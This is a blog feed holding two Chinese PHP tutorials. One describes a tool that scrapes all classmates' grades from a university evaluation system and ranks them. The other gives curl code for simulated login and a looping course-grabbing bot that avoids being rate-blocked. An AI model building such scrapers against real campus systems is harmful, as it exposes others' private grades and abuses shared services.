            <tag> Image Caption </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[趣味爬虫(下)定向爬取综测系统自身班级所有成绩并进行智育Z1分值排名]]></title>
      <url>http://yikunhaocong.com/2017/09/19/php-spider3/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    本博文只限于分享php学习经验，给像我一样刚入门的php小白提供借鉴的经验，将系统地分析如何用php代码实现学校综测系统的模拟登录、自动获取全班人成绩以及智育分Z1排名功能(本博文仅对已实现的爬取功能进行简介,实验环境是在校园网内)<br><a id="more"></a><p></p>
<h2 id="以下截取图的成绩详情来自于若干软件学院和计算机学院的测试账号"><a href="#以下截取图的成绩详情来自于若干软件学院和计算机学院的测试账号" class="headerlink" title="以下截取图的成绩详情来自于若干软件学院和计算机学院的测试账号"></a>以下截取图的成绩详情来自于若干软件学院和计算机学院的测试账号</h2><h2 id="先上综测网址的界面图"><a href="#先上综测网址的界面图" class="headerlink" title="先上综测网址的界面图"></a>先上综测网址的界面图</h2><h3 id="登录界面无验证码，比模拟教务系统简单"><a href="#登录界面无验证码，比模拟教务系统简单" class="headerlink" title="登录界面无验证码，比模拟教务系统简单"></a>登录界面无验证码，比模拟教务系统简单</h3><p><img src="http://op72m4y17.bkt.clouddn.com/34pp.png" alt="登录界面"></p>
<h3 id="综测界面"><a href="#综测界面" class="headerlink" title="综测界面"></a>综测界面</h3><p><img src="http://op72m4y17.bkt.clouddn.com/32pp.png" alt="综测界面"></p>
<h3 id="我们班某个同学综测的智育评测页面"><a href="#我们班某个同学综测的智育评测页面" class="headerlink" title="我们班某个同学综测的智育评测页面"></a>我们班某个同学综测的智育评测页面</h3><p><img src="http://op72m4y17.bkt.clouddn.com/41pp.png" alt="智育评测页面"></p>
<h2 id="再上自己写的成绩获取系统的界面图"><a href="#再上自己写的成绩获取系统的界面图" class="headerlink" title="再上自己写的成绩获取系统的界面图"></a>再上自己写的成绩获取系统的界面图</h2><h3 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h3><p><img src="http://op72m4y17.bkt.clouddn.com/33pp.png" alt="班级成绩获取系统登录界面"></p>
<h3 id="进入之后会显示班级成员名单，可以直接看成绩也可以直接看智育评测页面"><a href="#进入之后会显示班级成员名单，可以直接看成绩也可以直接看智育评测页面" class="headerlink" title="进入之后会显示班级成员名单，可以直接看成绩也可以直接看智育评测页面"></a>进入之后会显示班级成员名单，可以直接看成绩也可以直接看智育评测页面</h3><p><img src="http://op72m4y17.bkt.clouddn.com/35pp.png" alt="班级成员页面"></p>
<h3 id="查看某个人-计算机学院的某个同学-的成绩以及计算分值"><a href="#查看某个人-计算机学院的某个同学-的成绩以及计算分值" class="headerlink" title="查看某个人(计算机学院的某个同学)的成绩以及计算分值"></a>查看某个人(计算机学院的某个同学)的成绩以及计算分值</h3><p><img src="http://op72m4y17.bkt.clouddn.com/36pp.png" alt="个人成绩查看"><br><img src="http://op72m4y17.bkt.clouddn.com/39pp.png" alt="个人成绩查看"></p>
<h3 id="查看我们班某个同学的智育评测网页"><a href="#查看我们班某个同学的智育评测网页" class="headerlink" title="查看我们班某个同学的智育评测网页"></a>查看我们班某个同学的智育评测网页</h3><p><img src="http://op72m4y17.bkt.clouddn.com/40pp.png" alt="个人智育评测页面"></p>
<h3 id="点击计算班级智育Z1分后显示排名"><a href="#点击计算班级智育Z1分后显示排名" class="headerlink" title="点击计算班级智育Z1分后显示排名"></a>点击计算班级智育Z1分后显示排名</h3><p><img src="http://op72m4y17.bkt.clouddn.com/37pp.png" alt="班级排名"><br><img src="http://op72m4y17.bkt.clouddn.com/38pp.png" alt="班级排名"></p>
<h2 id="开发总结"><a href="#开发总结" class="headerlink" title="开发总结"></a>开发总结</h2><h3 id="版本更新过程："><a href="#版本更新过程：" class="headerlink" title="版本更新过程："></a>版本更新过程：</h3><p>1.v0.1.0 增加班级个人智育评测页面的入口，对不同分数层进行区别显示<br>2.v0.1.1 优化对班级审核或否的成绩的判断(未通过的成绩不予计算)<br>3.v0.1.2 增加对密码输入错误、登录失败、微信登录php传参异常的窗口提醒<br>总：这个系统的构造非常简洁，仅由三个php文件和一个html(登录界面组成)，采用最简单的post和get方式进行传参，该系统还有很多地方可以优化，博主希望自己能够再尽可能完善再开源给大家。</p>
<ul>
<li>模拟综测系统的登录和成绩获取比教务系统的成绩获取、抢课难度略低，如果在看完前两篇我写的php教程之后仍然觉得无从下手，请再看一遍或者多动手实践，先尝试自己写出教务系统的爬虫再尝试本系统的构建。<blockquote>
<p>本系统虽然已测试通过，但由于搭建环境是我的笔记本+Apache服务器软件(我自己租的服务器无法连入校园网)，负载均衡性略低于Nginx和node.js，因此只供功能测试和经验学习。后续会考虑将教务系统的成绩查询功能和选课功能加进去。前两篇php教程能够帮助php小白实现教务网的所有功能(已针对最基础的成绩爬取和最难的抢课进行讲解)，这一篇php教程主要是想让大家配合html/js进行前端界面的构建，以及尽可能多的去实践，毕竟实践出真知，校园的各个系统就是大家最好的试验场。</p>
<h3 id="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正。"><a href="#各位小伙伴有任何问题可以在下方留言，我会及时解答或订正。" class="headerlink" title="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正。"></a>各位小伙伴有任何问题可以在下方留言，我会及时解答或订正。</h3><p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
</blockquote>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 作者：Hac原创 </tag>
            
            <tag> 综测系统数据爬取、自动排名 </tag>
            
            <tag> php学习/实战笔记 </tag>
            
            <tag> php_curl快速开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[趣味爬虫(中)制作模拟登录并具备教务查询功能的脚本]]></title>
      <url>http://yikunhaocong.com/2017/09/19/php-spider2/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    本博文只限于分享php学习经验，给像我一样刚入门的php小白提供借鉴的经验，将系统地分析如何用php代码实现学校教务系统的模拟登录、自动选课功能(本博文针对抢课流程进行分析,实验环境是在校园网内)<br>    php脚本代码已开源至：<a href="https://github.com/Kali-Hac/php_spider" target="_blank" rel="external">https://github.com/Kali-Hac/php_spider</a><br><a id="more"></a><p></p>
<h2 id="基础：先把php语法学熟，并初步掌握php-curl库的用法"><a href="#基础：先把php语法学熟，并初步掌握php-curl库的用法" class="headerlink" title="基础：先把php语法学熟，并初步掌握php_curl库的用法"></a>基础：先把php语法学熟，并初步掌握php_curl库的用法</h2><p>想快速制作一个好的爬虫，关键在于对浏览器请求页面及所获数据的分析，分析得越彻底越仔细，你的代码模拟的效果就越可靠越高效。</p>
<h2 id="1-请确保你已经将上一篇博文教程的全部内容看完并基本理解完成"><a href="#1-请确保你已经将上一篇博文教程的全部内容看完并基本理解完成" class="headerlink" title="1.请确保你已经将上一篇博文教程的全部内容看完并基本理解完成"></a>1.请确保你已经将上一篇博文教程的全部内容看完并基本理解完成</h2><h3 id="先模拟登录获取cookie"><a href="#先模拟登录获取cookie" class="headerlink" title="先模拟登录获取cookie"></a>先模拟登录获取cookie</h3><blockquote>
<p>(具体登录方式还是沿用上一篇的手动输入验证码)以下代码来自上篇，也是这个脚本所必要的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    ini_set(&apos;max_execution_time&apos;, 3000);</div><div class="line">    session_start();</div><div class="line">    $id=session_id();</div><div class="line">    $_SESSION[&apos;id&apos;]=$id;</div><div class="line">    $cookie = tempnam(&apos;./cookie&apos;, &apos;cookie&apos;); //用一个随机的不重复的文件名保存cookie,$cookie即为cookie文件名  </div><div class="line">    $verify_code_url = &quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/CheckCode.aspx&quot;; //验证码地址</div><div class="line">    $curl = curl_init();//初始化一个curl</div><div class="line">    curl_setopt($curl, CURLOPT_URL, $verify_code_url);//设置URL</div><div class="line">    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);  //保存cookie</div><div class="line">    curl_setopt($curl, CURLOPT_HEADER, 0);//设置浏览器头</div><div class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);//设置返回方式，不自动输出，只能通过echo输出</div><div class="line">    $img = curl_exec($curl);  //执行curl，获得验证码图片</div><div class="line">    curl_close($curl);//关闭curl</div><div class="line">    $fp = fopen(&quot;verifyCode.jpg&quot;,&quot;w&quot;);  //打开一个jpg格式文件保存验证码</div><div class="line">    fwrite($fp,$img);   </div><div class="line">    fclose($fp);</div><div class="line">    header(&quot;Content-type: text/html; charset=gb2312&quot;); </div><div class="line">    //设置charset,这个在原网页html头部可以看到,避免输出编码错误 </div><div class="line">    sleep(10);//给你10s输入验证码</div><div class="line">    $_POST[&apos;code&apos;]= file_get_contents(&apos;code.txt&apos;);</div><div class="line">    $_POST[&apos;xh&apos;]=&apos;你的学号&apos;;</div><div class="line">    $_POST[&apos;pw&apos;]=&apos;你的密码&apos;;</div><div class="line">    $_SESSION[&apos;xh&apos;]=$_POST[&apos;xh&apos;];</div><div class="line">    $xh=$_POST[&apos;xh&apos;];</div><div class="line">    $pw=$_POST[&apos;pw&apos;];</div><div class="line">    $code= $_POST[&apos;code&apos;];</div><div class="line">    $url=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&quot;;  //教务处地址</div><div class="line">    $con1=login_post($url,$cookie,&apos;&apos;);</div><div class="line">    preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $con1, $view); //获取__VIEWSTATE字段并存到$view数组中</div><div class="line">    $post=array(</div><div class="line">        &apos;__VIEWSTATE&apos;=&gt;$view[1][0],</div><div class="line">        &apos;txtUserName&apos;=&gt;$xh,</div><div class="line">        &apos;TextBox2&apos;=&gt;$pw,</div><div class="line">        &apos;txtSecretCode&apos;=&gt;$code,</div><div class="line">        &apos;RadioButtonList1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学生&apos;),</div><div class="line">        &apos;Button1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;登录&apos;),</div><div class="line">        &apos;lbLanguage&apos;=&gt;&apos;&apos;,</div><div class="line">        &apos;hidPdrs&apos;=&gt;&apos;&apos;,</div><div class="line">        &apos;hidsc&apos;=&gt;&apos;&apos;</div><div class="line">    );</div><div class="line">    $con2=login_post($url,$cookie,http_build_query($post));</div><div class="line">    //echo $con2;</div><div class="line">//自定义一个发起curl链接的函数，传入url,cookie和post数据</div><div class="line">    function login_post($url,$cookie,$post)&#123;</div><div class="line">        $ch = curl_init();</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</div><div class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</div><div class="line">        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </div><div class="line">        curl_setopt($ch, CURLOPT_REFERER, &apos;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </div><div class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</div><div class="line">        $result=curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line">        return $result;</div><div class="line">    &#125;</div><div class="line">	preg_match_all(&apos;/&lt;span id=&quot;xhxm&quot;&gt;([^&lt;&gt;]+)&lt;\/span&gt;/&apos;, $con2, $xm);</div><div class="line">	$xm[1][0]=substr($xm[1][0],0,-4);  //字符串截取，获得姓名</div><div class="line">	$url2=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/xf_xsqxxxk.aspx?xh=&quot;.$xh.&quot;&amp;xm=&quot;.$xm[1][0];</div><div class="line">	$viewstate=login_post($url2,$cookie,&apos;&apos;);</div><div class="line">	preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $viewstate, $vs);</div><div class="line">	$state=$vs[1][0];  //$state存放一会post的__VIEWSTATE</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="再分析进入选课页面需要post的数据-如下-比如搜索”学术英语写作”这门公选课"><a href="#再分析进入选课页面需要post的数据-如下-比如搜索”学术英语写作”这门公选课" class="headerlink" title="再分析进入选课页面需要post的数据,如下,比如搜索”学术英语写作”这门公选课"></a>再分析进入选课页面需要post的数据,如下,比如搜索”学术英语写作”这门公选课</h3><p><img src="http://op72m4y17.bkt.clouddn.com/21p.png" alt="搜索课程的数据分析"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ddl_kcxz:</div><div class="line">ddl_ywyl:%D3%D0 //这个可以不用传递</div><div class="line">ddl_kcgs:</div><div class="line">ddl_xqbs:2//这个可以不用传递</div><div class="line">ddl_sksj:</div><div class="line">TextBox1:%D1%A7%CA%F5%D3%A2%D3%EF%D0%B4%D7%F7 //这个是重点，是&quot;学术英语写作&quot;的url编码</div><div class="line">Button2:%C8%B7%B6%A8 //这个也重要,是&quot; 提交 &quot;的url编码，注意这里的提交两个字两旁有空格，这个是从原html的value分析得到的，一定要完完全全按照value的格式提交才能够生效</div><div class="line">dpkcmcGrid%3AtxtChoosePage:2//这个可以不用传递</div><div class="line">dpkcmcGrid%3AtxtPageSize:15//这个可以不用传递</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">//比如你想搜索“中国文学与文化”这门课，需要提交以下数据</div><div class="line">$post=array(</div><div class="line">    &apos;__EVENTTARGET&apos;=&gt;&apos;&apos;,</div><div class="line">    &apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,</div><div class="line">    &apos;__VIEWSTATE&apos;=&gt;$state,//之前的代码已获取</div><div class="line">    &apos;ddl_kcxz&apos;=&gt;&apos;&apos;,</div><div class="line">    &apos;ddl_ywyl&apos;=&gt;&apos;&apos;,</div><div class="line">    &apos;ddl_kcgs&apos;=&gt;&apos;&apos;,</div><div class="line">    &apos;ddl_xqbs&apos;=&gt;&apos;2&apos;,</div><div class="line">    &apos;ddl_sksj&apos;=&gt;&apos;&apos;,</div><div class="line">    &apos;TextBox1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学术英语写作&apos;),</div><div class="line">    &apos;Button2&apos;=&gt; &apos;%C8%B7%B6%A8&apos;,</div><div class="line">    &apos;dpkcmcGrid%3AtxtChoosePage&apos;=&gt;&apos;1&apos;,</div><div class="line">    &apos;dpkcmcGrid%3AtxtPageSize&apos;=&gt;&apos;15&apos;,</div><div class="line">    );</div><div class="line">  $lesson_page=login_post($url2,$cookie,http_build_query($post));</div><div class="line">  echo $lesson_page;//输出搜索得到的页面</div></pre></td></tr></table></figure>
<h3 id="成功输出选课搜索得到的结果页面"><a href="#成功输出选课搜索得到的结果页面" class="headerlink" title="成功输出选课搜索得到的结果页面"></a>成功输出选课搜索得到的结果页面</h3><p><img src="http://op72m4y17.bkt.clouddn.com/22p.png" alt="php输出选课搜索结果"></p>
<blockquote>
<p>不过这个输出结果不是最优的，因为把没有余量的课程也输出来了，博主进行了一定的测试，发现只要将无用(默认)的参数去除，就可以自动筛选出还有余量的课程，这个对于抢课来说是必备的条件，可以减少不必要的点击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//post数据简化为</div><div class="line">$post=array(</div><div class="line">    &apos;__VIEWSTATE&apos;=&gt;$state,</div><div class="line">    &apos;TextBox1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学术英语写作&apos;),</div><div class="line">    &apos;Button2&apos;=&gt; &apos;%C8%B7%B6%A8&apos;,</div><div class="line">    );</div></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="成功得到筛选出还有余量的课程，如下图所示"><a href="#成功得到筛选出还有余量的课程，如下图所示" class="headerlink" title="成功得到筛选出还有余量的课程，如下图所示"></a>成功得到筛选出还有余量的课程，如下图所示</h3><p><img src="http://op72m4y17.bkt.clouddn.com/23p.png" alt="php输出页面"></p>
<h2 id="2-开始模拟选课按钮"><a href="#2-开始模拟选课按钮" class="headerlink" title="2.开始模拟选课按钮"></a>2.开始模拟选课按钮</h2><h3 id="在HTML页面中的表单提交中找到它的name或value值-需要post的值"><a href="#在HTML页面中的表单提交中找到它的name或value值-需要post的值" class="headerlink" title="在HTML页面中的表单提交中找到它的name或value值(需要post的值)"></a>在HTML页面中的表单提交中找到它的name或value值(需要post的值)</h3><ul>
<li>找到如下html，对应“学术英语写作”课程名称的选择<br><img src="http://op72m4y17.bkt.clouddn.com/24p.png" alt="对应的html代码"><blockquote>
<p>惊奇地发现，这个checkbox竟然没有value值(如下)！这个问题困扰了博主几分钟，本来想直接post value值的，看来只能另选方法了<br><img src="http://op72m4y17.bkt.clouddn.com/25p.png" alt="找不到提交的value值"></p>
<h3 id="先尝试选一门课试试？-我通选课课程已经选满了"><a href="#先尝试选一门课试试？-我通选课课程已经选满了" class="headerlink" title="先尝试选一门课试试？(我通选课课程已经选满了)"></a>先尝试选一门课试试？(我通选课课程已经选满了)</h3><p><img src="http://op72m4y17.bkt.clouddn.com/23p.png" alt="选一门课"><br>虽然选课失败，但是看了一下network,发现有页面更新了！显然，我们得到我们想要的了，就是如何提交课程数据<br><img src="http://op72m4y17.bkt.clouddn.com/27p.png" alt="查看抓包窗口"><br>是不是很熟悉？！之前我找到的是name=kcmcGrid%3A_ctl2%3Axk的checkbox,现在在页面中显示了它的状态为”on”，那结果已经很显然了，选课系统的选课是根据单个页面上的课程编号的(也就是说如果一个页面有10门课，那么教务系统一共有10个编号)，每个页面都是这10个编号，只是编号所指代的课程内容不同！再简单点说，你如果搜索到一门课，想选这门课，直接提交数据”‘kcmcGrid%3A_ctl2%3Axk’=&gt;’on’”就说明你勾选了第一门课(这里只显示一门，说明这是第一门的编号)，然后”提交”按钮的数据是”Button1:++%CC%E1%BD%BB++”,这个是中文“ 提交 ”的url编码，注意“提交”两边有空格，这个是为了跟原html页面上value值保持一致，如下图所示:<br><img src="http://op72m4y17.bkt.clouddn.com/28p.png" alt="注意提交的格式要一样"></p>
<h2 id="3-开始刷课-“抢课”"><a href="#3-开始刷课-“抢课”" class="headerlink" title="3.开始刷课(“抢课”)"></a>3.开始刷课(“抢课”)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    ini_set(&apos;max_execution_time&apos;, 3000);</div><div class="line">    session_start();</div><div class="line">    $id=session_id();</div><div class="line">    $_SESSION[&apos;id&apos;]=$id;</div><div class="line">    $cookie = tempnam(&apos;./cookie&apos;, &apos;cookie&apos;); //用一个随机的不重复的文件名保存cookie,$cookie即为cookie文件名  </div><div class="line">    $verify_code_url = &quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/CheckCode.aspx&quot;; //验证码地址</div><div class="line">    $curl = curl_init();//初始化一个curl</div><div class="line">    curl_setopt($curl, CURLOPT_URL, $verify_code_url);//设置URL</div><div class="line">    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);  //保存cookie</div><div class="line">    curl_setopt($curl, CURLOPT_HEADER, 0);//设置浏览器头</div><div class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);//设置返回方式，不自动输出，只能通过echo输出</div><div class="line">    $img = curl_exec($curl);  //执行curl，获得验证码图片</div><div class="line">    curl_close($curl);//关闭curl</div><div class="line">    $fp = fopen(&quot;verifyCode.jpg&quot;,&quot;w&quot;);  //打开一个jpg格式文件保存验证码</div><div class="line">    fwrite($fp,$img);   </div><div class="line">    fclose($fp);</div><div class="line">    header(&quot;Content-type: text/html; charset=gb2312&quot;); </div><div class="line">    //设置charset,这个在原网页html头部可以看到,避免输出编码错误 </div><div class="line"></div><div class="line">    sleep(10);//给你10s输入验证码</div><div class="line">    $_POST[&apos;code&apos;]= file_get_contents(&apos;code.txt&apos;);</div><div class="line">    $_POST[&apos;xh&apos;]=&apos;你的学号&apos;;</div><div class="line">    $_POST[&apos;pw&apos;]=&apos;你的密码&apos;;</div><div class="line">    $_SESSION[&apos;xh&apos;]=$_POST[&apos;xh&apos;];</div><div class="line">    $xh=$_POST[&apos;xh&apos;];</div><div class="line">    $pw=$_POST[&apos;pw&apos;];</div><div class="line">    $code= $_POST[&apos;code&apos;];</div><div class="line">    $url=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&quot;;  //教务处地址</div><div class="line">    $con1=login_post($url,$cookie,&apos;&apos;);</div><div class="line">    preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $con1, $view); //获取__VIEWSTATE字段并存到$view数组中</div><div class="line">    $post=array(</div><div class="line">        &apos;__VIEWSTATE&apos;=&gt;$view[1][0],</div><div class="line">        &apos;txtUserName&apos;=&gt;$xh,</div><div class="line">        &apos;TextBox2&apos;=&gt;$pw,</div><div class="line">        &apos;txtSecretCode&apos;=&gt;$code,</div><div class="line">        &apos;RadioButtonList1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学生&apos;),</div><div class="line">        &apos;Button1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;登录&apos;),</div><div class="line">        &apos;lbLanguage&apos;=&gt;&apos;&apos;,</div><div class="line">        &apos;hidPdrs&apos;=&gt;&apos;&apos;,</div><div class="line">        &apos;hidsc&apos;=&gt;&apos;&apos;</div><div class="line">    );</div><div class="line">    $con2=login_post($url,$cookie,http_build_query($post));</div><div class="line">    // echo $con2;</div><div class="line"></div><div class="line">//自定义一个发起curl链接的函数，传入url,cookie和post数据</div><div class="line">    function login_post($url,$cookie,$post)&#123;</div><div class="line">        $ch = curl_init();</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</div><div class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</div><div class="line">        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </div><div class="line">        curl_setopt($ch, CURLOPT_REFERER, &apos;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </div><div class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</div><div class="line">        $result=curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line">        return $result;</div><div class="line">    &#125;</div><div class="line">  preg_match_all(&apos;/&lt;span id=&quot;xhxm&quot;&gt;([^&lt;&gt;]+)&lt;\/span&gt;/&apos;, $con2, $xm);</div><div class="line">  $xm[1][0]=substr($xm[1][0],0,-4);  //字符串截取，获得姓名</div><div class="line">  //http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/xf_xsqxxxk.aspx?xh=</div><div class="line">  $url2=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/xf_xsqxxxk.aspx?xh=&quot;.$xh.&quot;&amp;xm=&quot;.$xm[1][0];</div><div class="line">  $viewstate=login_post($url2,$cookie,&apos;&apos;);</div><div class="line">  preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $viewstate, $vs);</div><div class="line">  $state=$vs[1][0];  //$state存放一会post的__VIEWSTATE</div><div class="line">  for($i=0;$i&lt;5;$i++)&#123; //设置连续抢课次数</div><div class="line">  $post=array(</div><div class="line">    &apos;__VIEWSTATE&apos;=&gt;$state,</div><div class="line">    &apos;TextBox1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学术英语写作&apos;),</div><div class="line">    &apos;Button2&apos;=&gt; &apos;%C8%B7%B6%A8&apos;,</div><div class="line">    &apos;kcmcGrid:_ctl2:xk&apos;=&gt;&apos;on&apos;,</div><div class="line">    &apos;Button1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;  提交  &apos;),</div><div class="line">    );</div><div class="line">  $lesson_page=login_post($url2,$cookie,  http_build_query($post));</div><div class="line">  echo $lesson_page;</div><div class="line">  //sleep(3);//可以设置每3s选课一次，这样不会被教务系统劝阻</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<h2 id="查看抢课结果"><a href="#查看抢课结果" class="headerlink" title="查看抢课结果"></a>查看抢课结果</h2><h3 id="页面输出结果如下"><a href="#页面输出结果如下" class="headerlink" title="页面输出结果如下"></a>页面输出结果如下</h3><p><img src="http://op72m4y17.bkt.clouddn.com/29p.png" alt="输出许多刷出来的页面"></p>
<blockquote>
<p>一般正常抢课时间是会有弹窗的(比如此课程已无余量等)，比如博主上次开这个脚本的时候就连续弹出多次(可以侧面说明抢课脚本正常运作)，但这次没有弹窗，如果验证脚本正常运行呢？</p>
<h3 id="验证已抢课，通过查看源代码"><a href="#验证已抢课，通过查看源代码" class="headerlink" title="验证已抢课，通过查看源代码"></a>验证已抢课，通过查看源代码</h3><p><img src="http://op72m4y17.bkt.clouddn.com/31p.png" alt="输出页面的源代码"><br><img src="http://op72m4y17.bkt.clouddn.com/30p.png" alt="输出页面的源代码"><br>仔细一点可以发现，每输出一个页面会有一个alert窗口，显示”选课门数超过限制”，虽然在浏览器看不到窗口，但是源代码的弹窗代码可以证明确实有在自动选课(我的两门课已满，所以会有此response)，只有在发送选课请求时才会有此js代码出现，因此验证完毕。</p>
</blockquote>
